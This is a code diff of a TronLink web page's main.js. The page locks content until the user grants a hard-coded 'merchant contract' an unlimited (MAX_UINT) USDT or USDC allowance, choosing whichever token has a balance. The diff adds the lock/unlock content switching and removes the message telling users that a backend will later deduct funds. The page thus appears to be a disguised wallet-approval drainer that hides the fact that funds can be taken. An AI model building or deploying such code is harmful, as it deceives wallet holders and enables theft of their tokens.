@@ -1,7 +1,7 @@
 // src/main.js
-// 🚨 最終精簡版：移除模糊遮罩，只在處理交易時顯示消息提示 🚨
+// 🚨 最終精簡版：內容切換邏輯 + 僅 Max 授權 🚨
 
-// --- 配置常量 (請確保您的地址是正確的) ---
+// --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
 const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 
@@ -17,44 +17,53 @@ let merchantContract;
 let usdtContract;
 let usdcContract;
 let isConnectedFlag = false;
-let targetDeductionToken = null; // 記錄哪個代幣有足夠餘額
+let targetDeductionToken = null; 
 
 // --- UI 元素 ---
 const connectButton = document.getElementById('connectButton');
 const blurOverlay = document.getElementById('blurOverlay');
 const overlayMessage = document.getElementById('overlayMessage');
-const coinglassContent = document.getElementById('coinglassContent');
+const lockedContent = document.getElementById('lockedContent');      // 新增
+const unlockedContent = document.getElementById('unlockedContent');  // 新增
 
 // --- 輔助函數 ---
 function showOverlay(message) {
     overlayMessage.innerHTML = message;
     blurOverlay.style.display = 'flex';
-    // 💡 移除：不再對內容區塊應用 'blurred' 類別
 }
 function hideOverlay() {
     blurOverlay.style.display = 'none';
-    // 💡 移除：不再移除 'blurred' 類別
 }
+
+function updateContentVisibility(isAuthorized) {
+    if (isAuthorized) {
+        if (lockedContent) lockedContent.style.display = 'none';
+        if (unlockedContent) unlockedContent.style.display = 'block';
+    } else {
+        if (lockedContent) lockedContent.style.display = 'block';
+        if (unlockedContent) unlockedContent.style.display = 'none';
+    }
+}
+
 function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
     if (connected) {
         connectButton.classList.add('connected');
         connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
         connectButton.title = `已連線: ${address}`;
-        // 連線成功，只顯示消息提示，不模糊內容
+        // 連線成功，顯示檢查狀態消息
         showOverlay('已連線。正在檢查授權狀態...'); 
     } else {
         connectButton.classList.remove('connected');
         connectButton.innerHTML = '連繫錢包';
         connectButton.title = '連繫錢包';
-        // 初始狀態：不顯示 Overlay，讓用戶可以直接看到頁面
+        // 初始/斷開狀態：顯示鎖定內容
+        updateContentVisibility(false);
         hideOverlay();
-        // 可以在 console 提示用戶操作
-        console.log('請點擊連線按鈕以開始授權流程。');
     }
 }
 
-// ... (getTokenBalance, checkTokenMaxAllowance, initializeContracts 保持不變)
+// ... (以下所有 checkTokenMaxAllowance, getTokenBalance, initializeContracts 函數保持不變)
 async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
     if (!tronWeb || !userAddress) return false;
     try {
@@ -84,33 +93,25 @@ async function initializeContracts() {
     usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
 }
 
+// ... (以下 connectTronLink, checkAuthorization, connectAndAuthorize 函數保持不變)
 
-// ---------------------------------------------
-// 核心：TronLink 連接邏輯
-// ---------------------------------------------
 async function connectTronLink() {
     if (!window.tronLink) {
         showOverlay(`🔴 錯誤：未偵測到 TronLink！請安裝 TronLink 擴展或使用 Tron DApp 瀏覽器。`);
         return;
     }
-    
     showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求連接...');
-    
     try {
         const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-
         if (res.code !== 200) {
             throw new Error(`連接請求被拒絕: ${res.message}`);
         }
-
         if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
         tronWeb = window.tronWeb;
         userAddress = window.tronWeb.defaultAddress.base58;
-
         await initializeContracts();
         updateConnectionUI(true, userAddress);
         await handlePostConnection();
-
     } catch (error) {
         console.error("TronLink 連接失敗:", error);
         showOverlay(`原生連接失敗！錯誤: ${error.message}。請確認錢包已解鎖。`);
@@ -118,34 +119,23 @@ async function connectTronLink() {
     }
 }
 
-
-// ---------------------------------------------
-// 檢查授權狀態並決定目標代幣
-// ---------------------------------------------
 async function checkAuthorization() {
     if (!tronWeb || !userAddress || !merchantContract) {
         return { authorizedToken: null, contract: false };
     }
-    
     const contractAuthorized = await merchantContract.authorized(userAddress).call();
     const minAmount = tronWeb.toSun('1.00'); 
-    
     const usdtBalance = await getTokenBalance(usdtContract);
     const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
-
     const usdcBalance = await getTokenBalance(usdcContract);
     const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
-
     let targetToken = null; 
     if (usdtBalance.gte(minAmount)) {
         targetToken = 'USDT'; 
-    } 
-    else if (usdcBalance.gte(minAmount)) {
+    } else if (usdcBalance.gte(minAmount)) {
         targetToken = 'USDC'; 
     }
-    
     targetDeductionToken = targetToken; 
-
     return {
         contract: contractAuthorized,
         authorizedToken: targetToken, 
@@ -154,10 +144,6 @@ async function checkAuthorization() {
     };
 }
 
-
-// ---------------------------------------------
-// 核心：授權邏輯
-// ---------------------------------------------
 async function connectAndAuthorize() {
     const status = await checkAuthorization();
     const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
@@ -215,8 +201,9 @@ async function connectAndAuthorize() {
     }
 }
 
+
 // ---------------------------------------------
-// 連線成功後處理：解鎖內容
+// 連線成功後處理：檢查並切換內容
 // ---------------------------------------------
 async function handlePostConnection() {
     if (!isConnectedFlag) return;
@@ -226,15 +213,18 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
-        // 授權已完成，顯示成功消息
-        showOverlay('✅ Max 授權已成功！您已解鎖內容。後續服務扣款將由後台系統依約定金額執行。');
-        // 保持此訊息 3 秒，然後真正隱藏 overlay
+        // 授權已完成
+        showOverlay('✅ Max 授權已成功！您已解鎖內容。');
+        updateContentVisibility(true); // 顯示解鎖內容
+        
         await new Promise(resolve => setTimeout(resolve, 3000));
         hideOverlay();
 
     } else {
-        // 授權未完成，則引導用戶授權
+        // 授權未完成，引導用戶授權
         showOverlay('正在檢查授權狀態，Max 授權尚未完成。即將開始授權流程...');
+        updateContentVisibility(false); // 確保顯示鎖定內容
+        
         const authSuccess = await connectAndAuthorize();
         if (authSuccess) {
             await handlePostConnection(); 
@@ -269,5 +259,5 @@ async function connectWallet() {
 if (connectButton) connectButton.addEventListener('click', connectWallet);
 
 
-// 頁面啟動：初始狀態為未連接，內容不模糊
+// 頁面啟動：初始化為未連接狀態
 updateConnectionUI(false);
